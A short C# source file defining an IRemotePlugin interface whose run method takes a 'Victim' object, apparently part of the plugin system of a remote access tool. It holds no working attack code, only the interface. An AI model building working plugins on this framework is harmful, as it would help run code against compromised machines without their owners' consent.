using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace winClient48
{
    internal class clsIRemotePlugin
    {
    }

    public interface IRemotePlugin
    {
        string szName { get; }
        string szVersion { get; }
        string szDescription { get; }
        void Initialize();

        void fnRun(Victim v, List<string> lsMsg);
    }
}
